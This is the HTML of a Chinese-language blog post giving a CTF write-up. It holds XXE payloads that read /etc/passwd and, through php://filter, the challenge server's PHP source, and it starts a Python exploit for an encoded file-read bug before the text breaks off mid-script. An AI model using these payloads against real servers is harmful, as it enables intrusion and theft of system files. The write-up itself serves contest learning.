@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x00 前言惨惨惨，速成了一下misc，最后还是21，那个web注入也没解出来 0x01 Game题目描述Enjoy the Game. 题目解答打开网页发现玩儿起来没什么异常，手残点不上三个也没有触发任何网络请求，所以使用devtool来分析js  在cqg.js中看到如下代码123456789if(score == 15)&amp;#123;    $.ajax(&amp;#123;        url:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络与信息安全领域专项赛WP">
+<meta property="og:url" content="http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/index.html">
+<meta property="og:site_name" content="Z3R0YU">
+<meta property="og:description" content="0x00 前言惨惨惨，速成了一下misc，最后还是21，那个web注入也没解出来 0x01 Game题目描述Enjoy the Game. 题目解答打开网页发现玩儿起来没什么异常，手残点不上三个也没有触发任何网络请求，所以使用devtool来分析js  在cqg.js中看到如下代码123456789if(score == 15)&amp;#123;    $.ajax(&amp;#123;        url:">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/VIOxbpveEhHfy2G.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/eRgxWLZnFyid18U.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/OiAnJa7lFsCxGUR.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/MZU7HyIdQARik1X.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/XG2EMCNBg1VcPxI.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/Gh4w9iobVFqJytm.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/IRlo2pfbsH8kGix.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/vnHfeML3Y7CAWby.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/MDjyHYscquJPXnR.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/uBVDzZcHSr4JPsd.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/IBnLsO7uE4GcyNm.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/16/sB5wKuyEYPvilHf.png">
+<meta property="og:updated_time" content="2019-08-16T03:05:44.342Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网络与信息安全领域专项赛WP">
+<meta name="twitter:description" content="0x00 前言惨惨惨，速成了一下misc，最后还是21，那个web注入也没解出来 0x01 Game题目描述Enjoy the Game. 题目解答打开网页发现玩儿起来没什么异常，手残点不上三个也没有触发任何网络请求，所以使用devtool来分析js  在cqg.js中看到如下代码123456789if(score == 15)&amp;#123;    $.ajax(&amp;#123;        url:">
+<meta name="twitter:image" content="https://i.loli.net/2019/08/16/VIOxbpveEhHfy2G.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>网络与信息安全领域专项赛WP</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml">
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/08/15/How_to_start_IoT_Reverse/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&text=网络与信息安全领域专项赛WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&title=网络与信息安全领域专项赛WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&is_video=false&description=网络与信息安全领域专项赛WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网络与信息安全领域专项赛WP&body=Check out this article: http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&title=网络与信息安全领域专项赛WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&title=网络与信息安全领域专项赛WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&title=网络与信息安全领域专项赛WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&title=网络与信息安全领域专项赛WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&name=网络与信息安全领域专项赛WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Game"><span class="toc-number">2.</span> <span class="toc-text">0x01 Game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述"><span class="toc-number">2.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答"><span class="toc-number">2.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-who-are-you"><span class="toc-number">3.</span> <span class="toc-text">0x02 who_are_you?</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-show-me-your-image"><span class="toc-number">4.</span> <span class="toc-text">0x03 show_me_your_image</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-2"><span class="toc-number">4.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-2"><span class="toc-number">4.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-签到题"><span class="toc-number">5.</span> <span class="toc-text">0x04 签到题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-3"><span class="toc-number">5.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-3"><span class="toc-number">5.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-24word"><span class="toc-number">6.</span> <span class="toc-text">0x05 24word</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-4"><span class="toc-number">6.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-4"><span class="toc-number">6.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-七代目"><span class="toc-number">7.</span> <span class="toc-text">0x06 七代目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-5"><span class="toc-number">7.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-5"><span class="toc-number">7.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-亚萨西"><span class="toc-number">8.</span> <span class="toc-text">0x07 亚萨西</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-6"><span class="toc-number">8.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-6"><span class="toc-number">8.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-sm4"><span class="toc-number">9.</span> <span class="toc-text">0x08 sm4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-7"><span class="toc-number">9.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-7"><span class="toc-number">9.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-db"><span class="toc-number">10.</span> <span class="toc-text">0x09 db</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-8"><span class="toc-number">10.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-8"><span class="toc-number">10.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        网络与信息安全领域专项赛WP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Z3R0YU</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-08-16T02:49:37.000Z" itemprop="datePublished">2019-08-16</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>惨惨惨，速成了一下misc，最后还是21，那个web注入也没解出来</p>
+<h2 id="0x01-Game"><a href="#0x01-Game" class="headerlink" title="0x01 Game"></a>0x01 Game</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>Enjoy the Game.</p>
+<h4 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h4><p>打开网页发现玩儿起来没什么异常，手残点不上三个也没有触发任何网络请求，所以使用devtool来分析js</p>
+<p><img src="https://i.loli.net/2019/08/16/VIOxbpveEhHfy2G.png" alt="9A105552-D2DA-4842-82BB-41532FACFF75.png"></p>
+<p>在cqg.js中看到如下代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score == <span class="number">15</span>)&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'score.php'</span>,</span><br><span class="line">        type: <span class="string">'POST'</span>,</span><br><span class="line">        data: <span class="string">'score='</span>+score,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> data = data;</span><br><span class="line">            $(<span class="string">"#output"</span>).text(data);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p>所以手动发一下请求得到flag</p>
+<p><img src="https://i.loli.net/2019/08/16/eRgxWLZnFyid18U.png" alt="C676ECDC-CE3F-4762-A1AB-D4A616A38117.png"></p>
+<h2 id="0x02-who-are-you"><a href="#0x02-who-are-you" class="headerlink" title="0x02 who_are_you?"></a>0x02 who_are_you?</h2><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>who are you?</p>
+<h4 id="题目解答-1"><a href="#题目解答-1" class="headerlink" title="题目解答"></a>题目解答</h4><p>编辑用户名提交，发现提交的是xml数据，自然想到xxe攻击</p>
+<p>因为此处是点击之后提交所以也就自然联想到是js发的请求，查看源码就能看到对应的js代码。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">            <span class="string">'&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;feedback&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;author&gt;'</span> + <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;/feedback&gt;'</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>构造常规的payload读<code>/etc/passwd</code>成功</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY&gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/08/16/OiAnJa7lFsCxGUR.png" alt="E1C38A08-C528-465F-9615-26446113B484.png"></p>
+<p>但是这种payload不能读取到对应的index.php源码文件，一是绝对路径我不知道（但是可以brute），二是这样读取在处理<code>&lt;</code>符号时会出现问题，所以要使用伪协议来进行处理。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY&gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最终读取到对应的源代码如下，flag就在源代码里面</p>
+<p><img src="https://i.loli.net/2019/08/16/MZU7HyIdQARik1X.png" alt="706FDA0A-96CC-4443-98AB-72EA2DBB999E.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//$flag='flag&#123;b634b4b5-7780-4641-86a7-0e4b43093b26&#125;';</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"./style.css"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"ie=edge"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class="contactBody"&gt;</span><br><span class="line">&lt;div class="wrapper"&gt;</span><br><span class="line">    &lt;div class="title"&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method="post" class="form"&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">"title"</span>&gt;è¯·è¾å¥å§å&lt;/h1&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;input type="text" class="name entry " id="name" name="name" placeholder="Your Name"/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;button class="submit entry" onclick="func()"&gt;Submit&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="shadow"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">            <span class="string">'&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;feedback&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;author&gt;'</span> + document.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;/feedback&gt;'</span>;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                document.getElementById(<span class="string">'title'</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="keyword">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-show-me-your-image"><a href="#0x03-show-me-your-image" class="headerlink" title="0x03 show_me_your_image"></a>0x03 show_me_your_image</h2><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>It’s no easy.</p>
+<h4 id="题目解答-2"><a href="#题目解答-2" class="headerlink" title="题目解答"></a>题目解答</h4><p>先上传一张正常图片，发现可以正常显示</p>
+<p><img src="https://i.loli.net/2019/08/16/XG2EMCNBg1VcPxI.png" alt="A9B778D3-C0A1-4756-A7E7-751E730CCB37.png"></p>
+<p>并且图片的链接如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fc663c386ea14c96ba9808b72602d341fda4447a2bfb4e01.changame.ichunqiu.com/img.php?name=lk7Bl4hRjmj%3D</span><br></pre></td></tr></table></figure></p>
+<p>主要观察img.php后面跟的请求参数，好像是base编码的一样，但是尝试base64解码之后发现是乱码。</p>
+<p><img src="https://i.loli.net/2019/08/16/Gh4w9iobVFqJytm.png" alt="80BE64FB-F874-4D8C-8BF6-ED466F5B5C14.png"></p>
+<p>但是并不影响我们猜测这是一个通过某种方式编码的任意文件读取漏洞，之后则是要进行已知明文猜解，通过fuzz的方式进行。发现可能是3-&gt;4的变种base编码，因此只要利用他自身的加密功能区加密，然后得到我们想要的加密字符串就好了。</p>
+<p>根据原理写出Exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_encode</span><span class="params">(target, filename)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(filename) != <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    r = requests.post(target+<span class="string">"upload.php"</span>,</span><br><span class="line">                      files=&#123;<span class="string">'file'</span>: (filename + <span class="string">'.jpg'</span>,</span><br><span class="line">                                      <span class="string">'z3r0test'</span>, <span 